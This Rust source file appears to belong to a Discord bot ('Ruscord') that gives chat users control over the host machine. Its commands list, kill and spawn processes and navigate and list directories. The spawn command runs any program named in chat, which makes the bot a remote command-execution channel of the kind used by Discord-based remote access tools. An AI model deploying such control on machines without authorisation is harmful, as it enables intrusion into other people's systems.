use std::{borrow::Cow, process::Stdio};

use sysinfo::{Pid, ProcessRefreshKind, RefreshKind, Users};
use tabled::{settings::Style, Table, Tabled};
use tokio::process::Command;

use crate::{commands::command_channel_check, reply_as_attachment, say, RuscordContext, RuscordResult};

#[derive(poise::ChoiceParameter)]
enum PsListSortBy {
	Memory,
	Name,
	Pid,
	Ppid,
}

#[derive(poise::ChoiceParameter, PartialEq, Eq)]
enum SortDirection {
	Ascending,
	Descending,
}
#[poise::command(
    prefix_command,
    slash_command,
    check = command_channel_check,
    subcommands("list", "kill", "spawn")
)]
/// Process management commands
pub async fn ps(_ctx: RuscordContext<'_>) -> RuscordResult<()> { Ok(()) }

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Lists running processes
pub async fn list(
	ctx: RuscordContext<'_>, #[description = "Sort by directive for the process list"] sort_by: Option<PsListSortBy>,
	#[description = "Sort direction for the process list"] sort_direction: Option<SortDirection>,
) -> RuscordResult<()> {
	let order = sort_by.unwrap_or(PsListSortBy::Name);
	let direction = sort_direction.unwrap_or(SortDirection::Ascending);

	#[derive(Tabled)]
	struct ProcessInfo<'a> {
		#[tabled(rename = "PPID")]
		ppid: Pid,
		#[tabled(rename = "PID")]
		pid: &'a Pid,
		#[tabled(rename = "Name")]
		name: Cow<'a, str>,
		#[tabled(rename = "Username")]
		username: String,
		#[tabled(rename = "Memory (B)")]
		memory: f64,
	}

	let mut sys =
		sysinfo::System::new_with_specifics(RefreshKind::nothing().with_processes(ProcessRefreshKind::everything()));
	ctx.defer().await?;
	sys.refresh_all();
	let users = Users::new_with_refreshed_list();

	let mut processes: Vec<_> = sys
		.processes()
		.iter()
		.map(|(pid, proc)| {
			let username = proc
				.user_id()
				.and_then(|uid| users.get_user_by_id(uid))
				.map(|user| user.name().to_string())
				.unwrap_or_else(|| String::from("Unavailable"));

			ProcessInfo {
				ppid: proc.parent().unwrap_or_else(|| Pid::from_u32(0)),
				pid,
				name: proc.name().to_string_lossy(),
				username,
				memory: proc.memory() as f64,
			}
		})
		.collect();

	// Sort the processes based on the selected order and direction
	processes.sort_by(|a, b| {
		let cmp = match order {
			PsListSortBy::Memory => a.memory.partial_cmp(&b.memory).unwrap_or(std::cmp::Ordering::Equal),
			PsListSortBy::Name => a.name.cmp(&b.name),
			PsListSortBy::Pid => a.pid.cmp(b.pid),
			PsListSortBy::Ppid => a.ppid.cmp(&b.ppid),
		};

		match direction {
			SortDirection::Ascending => cmp,
			SortDirection::Descending => cmp.reverse(),
		}
	});

	let table = Table::new(processes).with(Style::modern()).to_string();
	reply_as_attachment!(ctx, "processes.txt", table);
	Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Kill a process by PID
pub async fn kill(ctx: RuscordContext<'_>, #[description = "Process ID to kill"] pid: u32) -> RuscordResult<()> {
	let mut sys =
		sysinfo::System::new_with_specifics(RefreshKind::nothing().with_processes(ProcessRefreshKind::everything()));
	sys.refresh_processes(sysinfo::ProcessesToUpdate::All, true);

	let pid = Pid::from_u32(pid);
	if let Some(process) = sys.process(pid) {
		if process.kill() {
			say!(ctx, "Successfully killed process {}", pid);
		} else {
			say!(ctx, "Failed to kill process {}", pid);
		}
	} else {
		say!(ctx, "Process {} not found", pid);
	}
	Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Spawn a new process
pub async fn spawn(
	ctx: RuscordContext<'_>, #[description = "Command to run"] command: String,
	#[description = "Command arguments"] args: Option<String>,
) -> RuscordResult<()> {
	let mut cmd = Command::new(&command);
	cmd.stderr(Stdio::piped()).stdout(Stdio::piped()).stdin(Stdio::piped());
	#[cfg(target_os = "windows")]
	// Create new console
	cmd.creation_flags(0x00000010);
	if let Some(args) = args {
		cmd.args(args.split_whitespace());
	}

	match cmd.spawn() {
		Ok(mut child) => {
			say!(ctx, "Process spawned with PID: {:?}", child.id());

			tokio::task::spawn(async move {
				match child.wait().await {
					Ok(status) => {
						debug!("Spawned process exited: {}", status);
					},
					Err(e) => {
						error!("Failed to wait on spawned process: {}", e);
					},
				}
			});
		},
		Err(e) => {
			say!(ctx, "Failed to spawn process: {}", e);
		},
	}

	Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Display current working directory
pub async fn pwd(ctx: RuscordContext<'_>) -> RuscordResult<()> {
	match std::env::current_dir() {
		Ok(path) => {
			say!(ctx, "Current directory: `{}`", path.display());
		},
		Err(e) => {
			say!(ctx, "Failed to get current directory: {}", e);
		},
	}
	Ok(())
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// Change current working directory
pub async fn cd(ctx: RuscordContext<'_>, #[description = "Directory to change to"] path: String) -> RuscordResult<()> {
	ctx.defer().await?;
	let (tx, rx) = tokio::sync::oneshot::channel();
	tokio::task::spawn_blocking(move || match std::env::set_current_dir(path.as_str()) {
		Ok(_) => {
			if let Ok(new_path) = std::env::current_dir() {
				let _ = tx.send(format!("Changed directory to: `{}`", new_path.display()));
			} else {
				let _ = tx.send("Changed directory successfully".to_string());
			}
		},
		Err(e) => {
			let _ = tx.send(format!("Failed to change directory: {}", e));
		},
	})
	.await
	.unwrap();

	let msg = rx.await.unwrap();
	say!(ctx, msg);

	Ok(())
}

#[derive(poise::ChoiceParameter)]
enum LsSortBy {
	Name,
	Size,
	Modified,
}

#[poise::command(prefix_command, slash_command, check = command_channel_check)]
/// List directory contents
/// TODO: Add permissions
pub async fn ls(
	ctx: RuscordContext<'_>, #[description = "Directory to list (defaults to current)"] path: Option<String>,
	#[description = "List hidden files"] hidden: Option<bool>, #[description = "Sort by"] sort_by: Option<LsSortBy>,
	#[description = "Sort direction"] sort_direction: Option<SortDirection>,
) -> RuscordResult<()> {
	let hidden = hidden.unwrap_or(false);
	let order = sort_by.unwrap_or(LsSortBy::Name);
	let direction = sort_direction.unwrap_or(SortDirection::Ascending);

	ctx.defer().await?;

	#[derive(Tabled)]
	struct FileInfo {
		#[tabled(rename = "Type")]
		file_type: String,
		#[tabled(rename = "Name")]
		name: String,
		#[tabled(rename = "Size (B)")]
		size: u64,
		#[tabled(rename = "Modified")]
		modified: String,
		#[tabled(skip)]
		hidden: bool,
	}

	let path = path.unwrap_or_else(|| ".".to_string());
	let dir = match std::fs::read_dir(path) {
		Ok(dir) => dir,
		Err(e) => {
			say!(ctx, "Failed to read directory: {}", e);
			return Ok(());
		},
	};

	// Pre-allocate vector with estimated capacity
	let mut entries = Vec::with_capacity(32);

	// Moved closure outside loop for better reuse
	let get_modified_string = |elapsed: std::time::Duration| {
		let secs = elapsed.as_secs();
		match secs {
			0..=59 => format!("{} secs ago", secs),
			60..=3599 => format!("{} mins ago", secs / 60),
			3600..=86399 => format!("{} hours ago", secs / 3600),
			_ => format!("{} days ago", secs / 86400),
		}
	};

	for entry in dir.flatten() {
		let is_file_hidden = {
			#[cfg(unix)]
			{
				entry.file_name().to_string_lossy().starts_with('.')
			}
			#[cfg(windows)]
			{
				use std::os::windows::fs::MetadataExt;
				entry
					.metadata()
					.map(|e| e.file_attributes() & 0x00000002 != 0)
					.unwrap_or(false)
			}
		};

		if !hidden && is_file_hidden {
			continue;
		}

		let name = entry.file_name().to_string_lossy().into_owned();

		if let Ok(metadata) = entry.metadata() {
			let file_type = if metadata.is_dir() {
				"DIR"
			} else if metadata.is_file() {
				"FILE"
			} else if metadata.is_symlink() {
				"LINK"
			} else {
				"OTHER"
			};

			let modified = metadata
				.modified()
				.ok()
				.and_then(|time| time.elapsed().ok())
				.map(get_modified_string)
				.unwrap_or_else(|| "Unknown".to_string());

			entries.push(FileInfo {
				file_type: file_type.to_string(),
				name,
				size: metadata.len(),
				modified,
				hidden: is_file_hidden,
			});
		}
	}

	if entries.is_empty() {
		say!(ctx, "Directory is empty");
		return Ok(());
	}

	// Sort entries based on the selected order and direction
	entries.sort_by(|a, b| {
		// First sort by type priority: hidden dirs > dirs > hidden files > files
		let type_priority = |entry: &FileInfo| {
			match (entry.file_type.as_str(), entry.hidden) {
				("DIR", true) => 0,  // Hidden directory
				("DIR", false) => 1, // Normal directory
				(_, true) => 2,      // Hidden file/link/other
				(_, false) => 3,     // Normal file/link/other
			}
		};

		let type_cmp = type_priority(a).cmp(&type_priority(b));
		if type_cmp != std::cmp::Ordering::Equal {
			return type_cmp;
		}

		let cmp = match order {
			LsSortBy::Name => a.name.to_lowercase().cmp(&b.name.to_lowercase()),
			LsSortBy::Size => a.size.cmp(&b.size),
			LsSortBy::Modified => a.modified.cmp(&b.modified),
		};

		if direction == SortDirection::Ascending {
			cmp
		} else {
			cmp.reverse()
		}
	});

	let table = Table::new(entries).with(Style::modern()).to_string();
	reply_as_attachment!(ctx, "directory.txt", table);
	Ok(())
}
